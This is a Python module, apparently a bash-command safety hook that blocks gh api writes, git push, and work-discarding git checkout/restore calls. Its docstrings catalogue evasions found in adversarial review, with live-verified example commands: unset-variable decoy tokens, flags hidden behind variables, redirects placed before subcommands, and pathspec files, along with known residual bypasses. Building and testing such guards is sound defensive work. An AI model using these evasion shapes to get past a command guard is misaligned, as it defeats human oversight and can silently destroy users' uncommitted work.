    values are already lowercased (`_assigned_literals`), so `FF=-F`
    resolves to `"-f"`, the same string `-f` itself lowercases to. Also
    resolved via `_resolve_indirect_ref` (bash's own `${!NAME}` syntax),
    not just `_resolve_bare_var` -- found live by Step 8 independent
    review, tenth round (issue #1326), the field-flag counterpart of
    `_gh_api_method_flagname_dynamic_hit`'s own tenth-round fix.

    Resolved via `_substitute_var_refs_candidates` (fusion-aware), not
    the narrower `_resolve_bare_or_indirect` -- found live by Step 8
    independent review, twelfth round (issue #1326), the field-flag
    counterpart of `_gh_api_method_flagname_dynamic_hit`'s own
    twelfth-round fix: `FF=field; gh api ... --$FF name=value` (real
    bash: resolves to a genuine `--field name=value` write) was
    invisible to the whole-token-only resolver. Any candidate set too
    large to enumerate soundly is treated as an unresolved-but-plausible
    match -- fail closed."""
    for raw_tok in seg:
        if not _is_dynamic(raw_tok):
            continue
        if _is_unresolvable_substitution(raw_tok):
            return True
        candidates = _substitute_var_refs_candidates(raw_tok, name_to_value, name_to_raw_value)
        if candidates is None:
            return True
        if any(candidate.lower() in ("-f", "--field", "--raw-field") for candidate in candidates):
            return True
    return False


def _gh_api_field_fused_flagname_dynamic_hit(
    seg: list[str], name_to_value: dict[str, str], name_to_raw_value: dict[str, str]
) -> bool:
    """The field-flag counterpart of
    `_gh_api_method_fused_flagname_dynamic_hit`: the -f/--field/--raw-field
    flag NAME hidden behind a variable reference FUSED directly with its
    own value in the SAME token -- e.g. `FF=-f; gh api ... "$FF"name=value`
    dequotes to the single token `$FFname=value`. Found live by Step 8
    independent review, eighth round (issue #1326), immediately after the
    method-flag sibling above: real bash resolves
    `FF=-f; gh api .../1 "$FF"name=value` to a real `-fname=value` field
    write. Unlike the method flag, this rule never inspects the field
    value -- presence of the flag alone is denied, matching
    `_gh_api_field_literal_hit`'s own scope."""
    for raw_tok in seg:
        if not _is_dynamic(raw_tok):
            continue
        if _is_unresolvable_substitution(raw_tok):
            return True
        candidates = _substitute_var_refs_candidates(raw_tok, name_to_value, name_to_raw_value)
        if candidates is None:
            return True
        for candidate in candidates:
            lowered = candidate.lower()
            if lowered.startswith("-f") and len(candidate) > 2:
                return True
            if lowered.startswith("--field=") or lowered.startswith("--raw-field="):
                return True
    return False


def _rule_gh_api_write(
    segments: list[list[str]], lowered_command: str, name_to_value: dict[str, str], name_to_raw_value: dict[str, str]
) -> str | None:
    """`literals` is already lowercased, matching the predecessor script's
    own case-insensitive match against its whole lowered command -- so
    `-F`/`-f` are indistinguishable here exactly as they were there.
    Orchestrates the eight independent scanning passes above (four for
    the -X/--method write-method flag, four for the -f/-F/--field/
    --raw-field field flag -- literal, dynamic-value, dynamic-flag-name,
    and fused-flag-name-and-value, per side); kept deliberately thin
    (each pass owns its own branching) so this function's own cyclomatic
    complexity stays low."""
    for seg in segments:
        literals = [t.lower() for t in seg if not _is_dynamic(t)]
        has_gh_api = any(literals[i : i + 2] == ["gh", "api"] for i in range(len(literals) - 1))
        if not has_gh_api:
            continue
        has_graphql = any(literals[i : i + 3] == ["gh", "api", "graphql"] for i in range(len(literals) - 2))
        if has_graphql and "mutation" in lowered_command:
            return "a 'gh api graphql' call containing a 'mutation' keyword"

        if _gh_api_method_literal_hit(literals):
            return _METHOD_FLAG_HIT
        if _gh_api_method_dynamic_hit(seg, name_to_value, name_to_raw_value):
            return _METHOD_FLAG_DYNAMIC_HIT
        if _gh_api_method_flagname_dynamic_hit(seg, name_to_value, name_to_raw_value):
            return _METHOD_FLAG_DYNAMIC_HIT
        if _gh_api_method_fused_flagname_dynamic_hit(seg, name_to_value, name_to_raw_value):
            return _METHOD_FLAG_DYNAMIC_HIT

        if not has_graphql:
            if _gh_api_field_literal_hit(literals):
                return _FIELD_FLAG_HIT
            if _gh_api_field_dynamic_hit(seg):
                return _FIELD_FLAG_HIT
            if _gh_api_field_flagname_dynamic_hit(seg, name_to_value, name_to_raw_value):
                return _FIELD_FLAG_HIT
            if _gh_api_field_fused_flagname_dynamic_hit(seg, name_to_value, name_to_raw_value):
                return _FIELD_FLAG_HIT
    return None


# git's own value-taking global options that can appear as a SEPARATE
# following token (not just fused with "="): the two short options -c/-C
# (both collapse to lowered "-c") plus every long option from git's own
# usage synopsis that takes a value. `--exec-path`/`--html-path`/
# `--man-path`/`--info-path` are deliberately excluded: confirmed against
# git's own usage synopsis, `--exec-path` takes an OPTIONAL value only in
# the fused `--exec-path=<path>` form, and the other three take no value
# at all -- none of the three ever separates a `push` token from `git`
# the way a genuine separate-token value would.
_GIT_LONG_VALUE_FLAGS = {"--git-dir", "--work-tree", "--namespace", "--super-prefix", "--config-env"}


def _is_git_push_segment(seg: list[str], name_to_raw_value: dict[str, str]) -> bool:
    """Found live by Step 8 independent review, twenty-second round (issue
    #1326): the flag-skip loop below used to `break` the instant it met
    ANY dynamic-shaped token, abandoning the scan rather than looking
    past a token that vanishes to nothing at real bash runtime (per
    `_token_is_all_unassigned_refs`) -- `git -v $NEVERSET push origin
    main` (NEVERSET never assigned) was wrongly NOT recognized as a git
    push, since the loop broke at the decoy sitting after the literal
    `-v` flag, one position past where the `obfuscated_git_push_second_
    token` fallback in `_classify_tokens` looks (only `seg[1]`).
    Confirmed live via a real bash proxy (stand-in `git` binary on PATH,
    capturing its own argv) that this genuinely runs `git push origin
    main` once the decoy word-splits away. Closed by skipping (not
    breaking on) a vanishing token here too, the same primitive
    `_skip_fetch_exec_wrapper`'s own twenty-first-round fix already uses
    for an analogous position in the task-scoped sibling module.

    Found live by Step 8 independent review, twenty-third round (issue
    #1326): the fix above closed the OUTER flag-skip loop's own decoy
    gap, but the `-c`/`_GIT_LONG_VALUE_FLAGS` value-consumption block a
    few lines below it had the identical gap in miniature -- it read the
    token immediately after the flag directly (`next_tok = literals[j]`)
    to decide whether to consume it as the flag's own value, with no
    decoy-skip of its own. A decoy interposed there (`git -c $NEVERSET
    user.name=x push origin main`, NEVERSET never assigned) made this
    block see the decoy (dynamic, so `next_tok is None`) and correctly
    decline to consume it -- but the OUTER loop's own general decoy-skip
    then consumed the decoy on its own next iteration, landing on
    `user.name=x` as an ordinary, never-claimed token that does not
    start with `-`, so the outer loop `break`s there instead of
    recognizing it as `-c`'s own already-intended value and continuing
    to `push` one position further. Confirmed live via a real `git`
    binary (2.43.0) that `-c user.name=x push origin main` genuinely
    reaches push dispatch (`error: src refspec main does not match
    any` -- the real ref-lookup failure of an empty scratch repo, not a
    config-parse error) -- unlike the placeholder value `name=value`
    used during this fix's own development, which real git rejects
    before ever reaching a subcommand at all (`error: key does not
    contain a section: name`), a distinction found live by Step 8
    independent review, twenty-fourth round (issue #1326) and corrected
    here and in this fix's own tests. Closed by having this block
    look PAST a leading decoy run too before deciding whether the flag
    has a real value to consume, mirroring the outer loop's own skip
    shape at the position-decision level rather than the token-adjacency
    level.

    A second, distinct gap in the SAME block, found in the same twenty-
    third-round pass: the original condition only ever consumed a
    LITERAL value (`next_tok is not None`) -- an ASSIGNED, non-vanishing
    DYNAMIC value in this exact position (`CFG=user.name=x; git -c $CFG
    push origin main`) was never consumed either, predating this round
    entirely (the pre-round-22 code required a literal `next_tok` too).
    Confirmed live via a real bash proxy (stand-in `git` binary on PATH)
    that `-c` genuinely consumes `$CFG`'s own resolved value as real
    argv (`[-c] [user.name=x] [push] ...`), leaving `push` as the real
    subcommand -- missed entirely since `literals[value_j]` is always
    `None` for a dynamic token, so the old `value_candidate is not
    None and not value_candidate.startswith("-")` check could never
    fire for it. This function does not need to know what a dynamic
    value RESOLVES to here -- only that git's own CLI parser
    unconditionally consumes exactly one token in this position -- so a
    present (non-vanishing), DYNAMIC token is now also consumed,
    failing closed (assume it survives to occupy this position, so a
    real `push` sitting past it is not missed) the same direction this
    module already takes for an unresolvable dynamic value elsewhere
    (e.g. `_write_method_candidate_hit`). This does not disturb the
    established, deliberately fail-closed `git -C -v push`-shaped
    precedent (`test_is_git_push_segment_value_flag_followed_by_
    another_flag`): a LITERAL, flag-shaped token (confirmed live via
    real git that `-C`/`-c` genuinely consume even a literal
    flag-shaped value unconditionally, e.g. `-c -v` produces `error:
    key does not contain a section: -v`) is still deliberately declined
    here and re-examined as its own flag on the next outer-loop
    iteration -- unchanged, since real git's own fatal-error path on a
    malformed config key/path in that specific shape means no push
    actually reaches this scenario either way, and flagging it as a
    possible push anyway is the conservative, already-accepted choice
    for that literal case specifically.

    Takes NAME_TO_RAW_VALUE (case-preserving), not the lowercased
    NAME_TO_VALUE -- ported from `_token_is_all_unassigned_refs`'s own
    thirtieth-round fix (see its own docstring): this function's caller
    already has the case-preserving map in scope, and passing the
    lowercased one here would silently reintroduce that same round's own
    case-fold bug at this call site too."""
    literals = [(t.lower() if not _is_dynamic(t) else None) for t in seg]
    for i, tok in enumerate(literals):
        if tok != "git":
            continue
        j = i + 1
        while j < len(literals):
            # Bound to a local so mypy can narrow it below -- it cannot
            # narrow a repeated `literals[j]` subscript the way it narrows
            # a plain variable.
            candidate = literals[j]
            if candidate is None:
                if _token_is_all_unassigned_refs(seg[j], name_to_raw_value):
                    j += 1
                    continue
                break
            if not candidate.startswith("-"):
                break
            flag = candidate
            j += 1
            # `-c <name>=<value>` and `-C <path>` are git's own value-
            # taking short global options -- both collapse to the same
            # lowered "-c" token here -- and `--git-dir <path>`,
            # `--work-tree <path>`, `--namespace <name>`,
            # `--super-prefix <path>`, `--config-env <name>=<envvar>` are
            # git's own value-taking LONG global options, all of which
            # also accept the value as a separate following token, not
            # only fused with "=" (`--git-dir=<path>`). Skip that value
            # token too, or `git -C /tmp/repo push` / `git --git-dir
            # /tmp/repo push` would stop scanning at the non-flag-shaped
            # path argument and miss the `push` after it. The long-option
            # separate-token form was found live by Step 8 independent
            # review, fourth round (issue #1326): only the fused `=` form
            # was ever tested, so `git --git-dir /tmp/repo push origin
            # master` -- confirmed to actually push with real git --
            # went undetected. Every OTHER short global option (-v, -h,
            # -p, -P) is boolean and takes no argument, confirmed against
            # git's own usage synopsis -- originally this treated ANY
            # 2-char flag as value-taking, which wrongly swallowed the
            # "push" token itself as a boolean flag's "value" (found live
            # by Step 8, second round).
            if flag == "-c" or flag in _GIT_LONG_VALUE_FLAGS:
                value_j = j
                while value_j < len(literals):
                    value_candidate = literals[value_j]
                    if value_candidate is not None or not _token_is_all_unassigned_refs(
                        seg[value_j], name_to_raw_value
                    ):
                        break
                    value_j += 1
                if value_j < len(literals) and (value_candidate is None or not value_candidate.startswith("-")):
                    j = value_j + 1
        if j < len(literals) and literals[j] == "push":
            return True
    return any("git push" in lit for lit in (t.lower() for t in seg if not _is_dynamic(t)))


# --- git checkout/restore path extraction (issue #1375) --------------------
# `git checkout -- PATH` / `git restore PATH` / `git checkout .` can discard
# uncommitted work on a tracked path with no warning (the near-miss issue
# #1375 documents, issue #1128 repair 4). `classify()` stays I/O-free (this
# module's own established architecture, see `_is_git_push_segment`'s own
# `is_git_push`-then-live-wrapper-check split): this section only extracts
# every candidate path a checkout/restore invocation *could* discard,
# soundly and with no live git call, for hooks/check-bash-safety.sh's own
# new wrapper step to check against the real working tree via `git diff
# --quiet HEAD -- PATH`. An unresolved or unresolvable dynamic path token
# denies outright HERE rather than being passed through empty-handed --
# `git diff --quiet HEAD -- PATH` exits 0 (clean) for a path that does not
# exist, so treating an unresolved token as "nothing to check" would be
# fail-OPEN, not fail-closed (confirmed live, git 2.43.0).
#
# Disclosed residual, matching this module's own established convention
# (see the module docstring's own "Known, disclosed limitation" paragraph
# above): a decoy token between `git` and `checkout`/`restore` that
# vanishes via a bash parameter-expansion operator OTHER than a bare
# reference or the default/assign-default/alt-value clauses (`${NAME:-}`/
# `${NAME-}`, `${NAME:=}`/`${NAME=}`, `${NAME:+x}`/`${NAME+x}`) -- e.g.
# substring expansion, prefix/suffix removal, pattern substitution, or
# case modification, all of which also evaluate to the empty string on an
# unset variable -- is not recognized as vanishing; that `git` occurrence
# is correctly treated as ambiguous rather than silently misread as a safe
# checkout/restore. Pinned as `checkout-restore-exotic-parameter-
# expansion-decoy` in hooks/test_gitapex_check_bash_safety.py's own
# `KNOWN_BYPASS_COMMANDS`.

_GIT_TREE_RELOCATION_LONG_FLAGS = {"--git-dir", "--work-tree"}
_GIT_GLOBAL_SHORT_VALUE_FLAGS = {"-c", "-C"}
_GIT_TREE_ENV_VARS = ("GIT_DIR", "GIT_WORK_TREE", "GIT_INDEX_FILE")

_RESTORE_BOOLEAN_FLAGS = {
    "--quiet",
    "-q",
    "--progress",
    "--no-progress",
    "--overlay",
    "--no-overlay",
    "--ours",
    "--theirs",
    "--merge",
    "-m",
    "--ignore-unmerged",
    "--ignore-skip-worktree-bits",
}
_RESTORE_VALUE_FLAGS = {"--source", "-s", "--conflict"}
_CHECKOUT_BRANCH_CREATION_FLAGS = {"-b", "-B", "--orphan"}


def _resolve_path_tokens(tokens: list[str], name_to_raw_value: dict[str, str]) -> tuple[str | None, tuple[str, ...]]:
    """Resolve every token in TOKENS to one or more literal path
    candidates for a `git checkout`/`git restore` invocation. A literal
    token is used as-is. A dynamic token is resolved via this module's
    existing `_substitute_var_refs_candidates`, called with the
    CASE-PRESERVING NAME_TO_RAW_VALUE as both its value map and its
    raw-value map -- unlike every other caller of that function in this
    module (which resolves against the lowercased `name_to_value`, since
    they only ever compare a resolved value case-insensitively against a
    known tool/verb/flag literal), a filesystem path is case-sensitive, so
    lowercasing it here would resolve to the wrong path. An unresolvable
    token (empty candidate list), a too-large candidate set (`None`, the
    same fail-closed convention `_substitute_var_refs_candidates`'s own
    callers already use), or a candidate that ITSELF still contains `$`/
    backtick after substitution all deny outright here rather than being
    passed to the live wrapper check empty-handed -- see this section's
    own module-level comment for why that would be fail-open.

    The still-dynamic-candidate check closes a real gap found while
    building this function: `_substitute_var_refs_candidates`'s own
    `_VAR_REF_FULL_RE` does not match bash array-subscript syntax
    (`${paths[@]}`, `${paths[0]}`) at all (issue #1375's own Fact 5 cites
    this exact limitation, and it is the same gap this module's own
    `array-literal-assignment-indirection` `KNOWN_BYPASS_COMMANDS` entry
    documents for verb reconstruction) -- with no `$NAME`-shaped match
    found inside the token, the function harmlessly returns the token's
    own text UNCHANGED as if it were already a resolved literal, so
    `paths=(a.py b.py); git checkout -- "${paths[@]}"` would otherwise
    silently pass the literal string `${paths[@]}` through as a
    "resolved" candidate instead of being recognized as still-unresolved.
    Confirmed live during this function's own development (before this
    check was added)."""
    paths: list[str] = []
    for tok in tokens:
        if not _is_dynamic(tok):
            paths.append(tok)
            continue
        candidates = _substitute_var_refs_candidates(tok, name_to_raw_value, name_to_raw_value)
        if not candidates or any(_is_dynamic(candidate) for candidate in candidates):
            return (
                f"a git checkout/restore command has a dynamic path argument ({tok!r}) that could not be "
                "resolved to a literal value -- an unresolved path cannot be safely checked against the "
                "working tree, so this is denied outright",
                (),
            )
        paths.extend(candidates)
    return None, tuple(paths)


def _git_checkout_paths(
    tokens_after: list[str], name_to_raw_value: dict[str, str]
) -> tuple[str | None, tuple[str, ...]]:
    """checkout_restore_paths for a `git checkout` invocation, TOKENS_AFTER
    being every segment token following the literal `checkout` word.
    Three sound sub-cases, none requiring a live ref-existence lookup
    (issue #1375's own Fact 5 documents the live-git verification each
    relies on, git 2.43.0):

    (a) `--` present -- every token after it is a path (git's own
        pathspec-disambiguation syntax, and the near-miss's own exact
        shape). `git checkout --` with nothing following denies outright:
        real git treats this as a harmless no-op, but a downstream pipe or
        loop (`git checkout -- | xargs ...`-shaped) could still append
        paths at runtime this classifier cannot see, and denying a
        genuine no-op costs nothing.
    (b) No `--`, 2+ non-flag-shaped positional tokens -- confirmed live
        that `git checkout no-such-ref no-such-file` (two unresolvable
        positionals, no `--`) reports a pathspec error for BOTH, meaning
        whenever real git is given 2+ positionals with no `--` AND no
        `-b`/`-B`/`--orphan` (see below), every position past the first is
        a pathspec under every resolution git can take. Over-including a
        token that also happens to be a valid ref name just checks a path
        that likely does not exist, which is harmless.
    (c) No `--`, exactly one positional token, and it is the literal `.`
        or `..` -- both are syntactically invalid git ref names (confirmed
        live: `git check-ref-format --branch .`/`--branch ..` both fail,
        "not a valid branch name"), so this is unambiguously a path, not a
        ref, with no live lookup needed. `git checkout .` on a dirty
        tracked file was confirmed live to silently discard the change.

    Bare `git checkout SOMENAME` (single positional, not `.`/`..`, no
    `--`) is a deliberate Non-goal: SOMENAME might be a branch/ref name or
    a path, and disambiguating soundly needs a live ref-existence lookup
    this pure classifier does not perform.

    `-b`/`-B`/`--orphan` (git's own branch-creation/reset mode, mutually
    exclusive with every pathspec-checkout mode above per `git checkout
    -h`'s own synopsis) is checked FIRST, before any sub-case above, and
    folded into that same Non-goal -- CRITICAL bug found by independent
    adversarial review (round 4, issue #1375) and independently
    reproduced live: `-b`/`-B` take the immediately following token as
    their own new-branch-NAME value, which does not start with `-`, so
    sub-case (b)'s own dash-prefix positional filter swept a value like
    `git checkout -f -b newbranch other` into `checkout_restore_paths =
    ('newbranch', 'other')` -- neither of which is the actual at-risk
    file -- and the wrapper's live `git diff --quiet` check against those
    two nonexistent paths found "clean" and silently ALLOWED a real,
    forced branch switch that discarded an uncommitted change to an
    entirely different, unchecked file. Worse than the already-accepted
    bare-SOMENAME Non-goal above: that one makes NO claim at all (falls
    through with an empty `checkout_restore_paths`, the same as if this
    classifier had never seen the command, honestly matching real git's
    own built-in switch-protection minus whatever `-f` already bypasses);
    sub-case (b)'s old behavior here instead made a CONFIDENT, WRONG claim
    that specific paths were checked and clean. Folding this case into the
    Non-goal (rather than a live-git-lookup-free sound extraction, which
    would need to reproduce git's own internal "would this branch switch
    overwrite ANY dirty tracked file in the whole working tree" logic --
    out of a pure classifier's reach) restores the honest, no-claim
    behavior and removes the false-confidence gap; it does not newly
    regress anything `-f`/`-b` could already do to an unguarded working
    tree before this classifier existed at all.

    `--pathspec-from-file`/`--pathspec-file-nul` (real git accepts both on
    `checkout`, not just `restore`) is checked next and DENIES outright --
    CRITICAL bug found by independent adversarial review (round 5, issue
    #1375) and independently reproduced live: `_git_restore_paths` already
    hard-denies this exact flag pair ("paths come from a file this
    classifier cannot inspect"), but `_git_checkout_paths` never
    recognized it at all, so `git checkout --pathspec-from-file
    files.txt` (a single positional, `files.txt`, itself not `.`/`..`)
    fell all the way through to the bare-SOMENAME Non-goal above -- an
    HONEST no-claim shape for an ordinary ambiguous ref/path, but not for
    a flag whose own value-consumption is a FILE CONTAINING THE REAL
    PATHSPECS this classifier cannot read. Live-verified: with a tracked
    file listed in that control file dirtied, the wrapper allowed the
    command (exit 0, no check performed) and the real `git checkout
    --pathspec-from-file` silently discarded the change. Denying here,
    matching restore's own established treatment, rather than folding
    into the Non-goal: unlike the `-b`/`-B` case above (where an
    unresolvable "would this overwrite anything" question is inherent to
    branch switching itself, matching git's own already-imperfect native
    protection), a pathspec-from-file's paths are knowable in principle --
    this classifier simply cannot read the named file -- so silently
    granting no-claim safety here would under-serve the exact opaque-path
    threat model this whole feature exists to close, not merely decline
    to extend coverage."""
    if any(tok in _CHECKOUT_BRANCH_CREATION_FLAGS or tok.startswith("--orphan=") for tok in tokens_after):
        return None, ()
    if any(
        tok == "--pathspec-from-file" or tok.startswith("--pathspec-from-file=") or tok == "--pathspec-file-nul"
        for tok in tokens_after
    ):
        return (
            "a 'git checkout --pathspec-from-file'/'--pathspec-file-nul' flag reads paths from a file this "
            "classifier cannot inspect, so this is denied outright",
            (),
        )
    if "--" in tokens_after:
        after = tokens_after[tokens_after.index("--") + 1 :]
        if not after:
            return (
                "a 'git checkout --' with no paths following it in this command -- a downstream pipe or loop "
                "could append paths at runtime this classifier cannot see, so this is denied outright",
                (),
            )
        return _resolve_path_tokens(after, name_to_raw_value)
    positionals = [t for t in tokens_after if not t.startswith("-")]
    if len(positionals) >= 2:
        return _resolve_path_tokens(positionals, name_to_raw_value)
    if len(positionals) == 1 and not _is_dynamic(positionals[0]) and positionals[0] in (".", ".."):
        return _resolve_path_tokens(positionals, name_to_raw_value)
    return None, ()


def _git_restore_paths(
    tokens_after: list[str], name_to_raw_value: dict[str, str]
) -> tuple[str | None, tuple[str, ...]]:
    """checkout_restore_paths for a `git restore` invocation, TOKENS_AFTER
    being every segment token following the literal `restore` word.
    Case-sensitive flag walk over an explicit, enumerated vocabulary --
    deliberately NOT reusing `_is_git_push_segment`'s own lower-casing
    step, which would collapse `-S` (`--staged`, boolean) and `-s`
    (`--source`, value-taking) into the same token and misread a
    working-tree-destroying `git restore -s main file.py` as
    staged-only-safe (issue #1375's own Fact 5). `saw_staged`/
    `saw_worktree` are last-occurrence-wins (`--staged --no-staged` ends
    with `saw_staged=False`); this invocation is safe (empty
    checkout_restore_paths, never live-checked) iff `saw_staged` and not
    `saw_worktree`. Any flag-shaped token not in this vocabulary --
    including `--pathspec-from-file`/`--pathspec-file-nul`, whose paths
    come from a file this classifier cannot inspect -- denies outright
    rather than risk under-extracting paths past a flag whose own
    value-consumption behavior is unknown here."""
    saw_staged = False
    saw_worktree = False
    path_tokens: list[str] = []
    i = 0
    n = len(tokens_after)
    while i < n:
        tok = tokens_after[i]
        if tok == "--":
            # Real git syntax: `--` disambiguates every remaining token as
            # a pathspec, the identical role it plays for `git checkout`
            # (see `_git_checkout_paths`'s own sub-case (a)). Found by
            # independent adversarial review of this PR: the pre-fix
            # version had no case for a literal `--` at all, so it fell
            # into the unrecognized-flag branch below and denied an
            # entirely ordinary, harmless `git restore -- PATH` outright.
            path_tokens.extend(tokens_after[i + 1 :])
            i = n
            break
        if tok == "--pathspec-from-file" or tok.startswith("--pathspec-from-file=") or tok == "--pathspec-file-nul":
            return (
                "a 'git restore --pathspec-from-file'/'--pathspec-file-nul' flag reads paths from a file this "
                "classifier cannot inspect, so this is denied outright",
                (),
            )
        if tok in ("--staged", "-S"):
            saw_staged = True
            i += 1
            continue
        if tok == "--no-staged":
            saw_staged = False
            i += 1
            continue
        if tok in ("--worktree", "-W"):
            saw_worktree = True
            i += 1
            continue
        if tok == "--no-worktree":
            saw_worktree = False
            i += 1
            continue
        if tok == "--recurse-submodules" or tok.startswith("--recurse-submodules="):
            i += 1
            continue
        if tok in _RESTORE_BOOLEAN_FLAGS:
            i += 1
            continue
        if tok in _RESTORE_VALUE_FLAGS:
            i += 2
            continue
        if any(tok.startswith(f"{flag}=") for flag in _RESTORE_VALUE_FLAGS):
            # Fused `--source=main`/`--conflict=diff3`: self-contained,
            # unlike the separate-token form above -- no extra token to
            # skip. Found by independent adversarial review of this PR:
            # the pre-fix version only recognized the bare, separate-token
            # spelling and denied this equally legitimate fused one as an
            # unrecognized flag.
            i += 1
            continue
        if tok.startswith("-"):
            return (
                f"an unrecognized 'git restore' flag ({tok!r}) -- this classifier cannot safely guarantee "
                "correct path extraction past an unrecognized flag that might itself consume the next token, "
                "so this is denied outright",
                (),
            )
        path_tokens.append(tok)
        i += 1
    if saw_staged and not saw_worktree:
        return None, ()
    return _resolve_path_tokens(path_tokens, name_to_raw_value)


# A whole token that is EXACTLY one `${NAME-}`/`${NAME:-}` (empty default
# text), `${NAME=}`/`${NAME:=}` (empty ASSIGN-default text -- also
# assigns NAME the empty string as a side effect, which does not change
# whether THIS token itself vanishes), or `${NAME+anything}`/
# `${NAME:+anything}` (alternate-value clause) construct -- nothing else
# fused in. Deliberately narrower than `_ONE_REF_SRC`'s own general
# reference-run matching (this is a single, whole-token check, not a "run
# of references" one): the clause shapes below need their own NAME
# extracted and their own vanishing rule applied (see
# `_token_is_a_vanishing_default_or_alt_clause`'s own docstring), unlike a
# bare/braced/subscript reference where any run of them can be fused
# together and each one either independently vanishes or doesn't.
#
# `${NAME:?}`/`${NAME?}` (empty error-message clause) is deliberately NOT
# included here: unlike every clause above, this one does not silently
# vanish when NAME is unset -- real bash prints the message to stderr and
# TERMINATES the command entirely (non-interactively) with a non-zero
# status, confirmed live, so `checkout`/`restore` never even runs. Treating
# it as ambiguous (the default, unrecognized-dynamic-token fallback) is
# already safe: there is no real invocation for a missed detection to miss.
_EMPTY_DEFAULT_CLAUSE_RE = re.compile(r"^\$\{(?P<name>[A-Za-z_][A-Za-z0-9_]*):?[-=]\}$")
_ALT_VALUE_CLAUSE_RE = re.compile(r"^\$\{(?P<name>[A-Za-z_][A-Za-z0-9_]*)(?P<colon>:)?\+[^}]*\}$")


def _token_is_a_vanishing_default_or_alt_clause(token: str, name_to_raw_value: dict[str, str]) -> bool:
    """TOKEN word-splits away to NOTHING, unquoted, at real bash runtime,
    because it is an `${NAME-}`/`${NAME:-}` (empty default), `${NAME=}`/
    `${NAME:=}` (empty assign-default -- confirmed live this also
    vanishes to nothing the identical way, the assignment side effect
    notwithstanding), or `${NAME+word}`/`${NAME:+word}` (alternate-value)
    construct whose own substitution is empty. Deliberately narrow and
    LOCAL to this module's own checkout/restore detection (issue #1375)
    rather than folded into
    `_token_is_all_unassigned_refs` itself: that function's own docstring
    explicitly and, for a NON-empty default/alt text, CORRECTLY excludes
    every default-clause shape ("a default-clause reference supplies REAL
    substitute text regardless of whether NAME is assigned, so it never
    vanishes to nothing") -- widening that already heavily-scrutinized,
    many-times-revised shared primitive (28+ documented rounds of narrow
    fixes and reverted over-generalizations, per its own docstring) is a
    materially larger, riskier change than this specific, live-confirmed
    gap warrants; every existing caller of that function keeps its exact
    prior behavior unchanged.

    Found live by independent adversarial review of this PR, in the SAME
    position the already-fixed `$NEVERSET`-shaped bug occupied: that
    function's own blanket exclusion is only sound when the default/alt
    text is non-empty -- `${NEVERSET:-}`, `${NEVERSET-}`, and
    `${NEVERSET:+x}` (NEVERSET genuinely never assigned) all confirmed
    live (a real bash proxy capturing argv) to word-split away to nothing
    identically to a bare `$NEVERSET`, making `git ${NEVERSET:-} checkout
    -- file.py` genuinely run as `git checkout -- file.py` -- the same
    near-zero-effort bypass of the entire feature the bare-reference fix
    closed, in a shape that fix's own primitive does not recognize.

    Two sound, narrow cases, both delegating the actual "does NAME itself
    vanish" question back to `_token_is_all_unassigned_refs` on a
    synthesized plain `${NAME}` reference (reusing its own already-correct,
    already-tested per-name rule -- assigned-empty and assigned-all-IFS-
    whitespace both count as vanishing there too -- rather than
    re-deriving it here):
    - `${NAME-}`/`${NAME:-}` (default text is the empty string, checked
      via the regex itself, not a resolved value): the whole construct
      substitutes NAME's own value if NAME is set (colon form: set AND
      non-empty), else the empty default text -- either way, this
      construct vanishes exactly when NAME itself does.
    - `${NAME:+word}` (colon form): substitutes WORD only when NAME is set
      AND non-empty, else nothing -- so this construct vanishes exactly
      when NAME itself does, regardless of WORD's own content (WORD is
      never evaluated in the vanishing branch).
    - `${NAME+word}` (no-colon form): substitutes WORD when NAME is set at
      ALL (even assigned-empty), else nothing -- a stricter condition than
      `_token_is_all_unassigned_refs`'s own "set but empty/IFS-whitespace
      still counts as vanishing," so this form is only recognized when
      NAME is not a key in NAME_TO_RAW_VALUE at all, not delegated to that
      broader check."""
    match = _EMPTY_DEFAULT_CLAUSE_RE.match(token)
    if match:
        return _token_is_all_unassigned_refs(f"${{{match.group('name')}}}", name_to_raw_value)
    match = _ALT_VALUE_CLAUSE_RE.match(token)
    if match:
        if match.group("colon"):
            return _token_is_all_unassigned_refs(f"${{{match.group('name')}}}", name_to_raw_value)
        return match.group("name") not in name_to_raw_value
    return False


_REDIRECT_OPERATORS = {"<", ">", ">>", "<<", "<<<", "&>", ">&", "&>>", "<>"}


def _redirect_span_length(seg: list[str], j: int) -> int:
    """The number of tokens, starting at SEG[j], that make up one bash
    I/O-redirection clause -- an optional leading bare file-descriptor
    number (`2>`), a redirect operator (`_REDIRECT_OPERATORS`), and
    exactly one target token. `segment_tokens` never splits a segment at
    `<`/`>` (see `_SINGLE_OPS`'s own docstring -- a redirect may legally
    sit anywhere before a command word without being that word itself),
    so each piece of the clause survives here as its own separate token
    (confirmed via `tokenize()`: `git > /dev/null checkout` tokenizes to
    `['git', '>', '/dev/null', 'checkout']`; `git 2> /dev/null checkout`
    to `['git', '2', '>', '/dev/null', 'checkout']`). Returns 0 when
    SEG[j:] does not start with this shape, so a caller can treat 0 as
    "not a redirect, do not skip" without a separate boolean check.

    CRITICAL bug found by independent adversarial review (round 14, issue
    #1375) and independently reproduced live: every existing skip-past-
    decoy walk in this file's checkout/restore detection --
    `_find_git_checkout_restore`'s own global-flag-skip loop and
    `_first_surviving_segment_word`'s own leading-vanishing-run walk --
    had no concept of a redirect clause at all, so a bare `>`/`<` token
    (ordinary, legal bash syntax) broke both: `git > /dev/null checkout
    -- dirty.py` (a fully literal command, no dynamic content at all)
    resolved to an empty, wrong `checkout_restore_paths` (the redirect
    operator token itself was mistaken for the subcommand position and
    the scan gave up), and `X=cd; > /dev/null $X sub; git checkout --
    dirty.py` resolved to a confident, wrong ALLOW (the redirect made
    `_first_surviving_segment_word` return the operator token itself,
    which is neither vanishing nor dynamic, so the real, cd-resolving
    `$X` one position later was never checked) -- both live-verified
    (real bash, and end-to-end through the real wrapper against a
    scratch git repo) to silently discard a genuinely dirty file."""
    n = len(seg)
    i = j
    if i < n and seg[i].isdigit():
        i += 1
    if i < n and seg[i] in _REDIRECT_OPERATORS and i + 1 < n:
        return i + 2 - j
    return 0


def _dynamic_token_resolves_only_to_literal(token: str, name_to_raw_value: dict[str, str], literal: str) -> bool:
    """Whether TOKEN unambiguously resolves, at real bash runtime, to
    exactly LITERAL (case-insensitively, matching this function's own
    caller's existing case-insensitive literal comparison) and nothing
    else -- narrower than "could plausibly resolve to LITERAL": an
    ambiguous or unresolvable token declines (returns `False`) rather
    than assuming the positive case, since a false positive here would
    mis-attribute an unrelated dynamic command word's own subcommand
    (e.g. `$TOOL checkout` where TOOL is some other, non-git tool that
    also happens to have a `checkout` subcommand) as a git checkout/
    restore invocation -- unlike the cwd-relocation check's own
    fail-closed posture, `_find_git_checkout_restore`'s own docstring
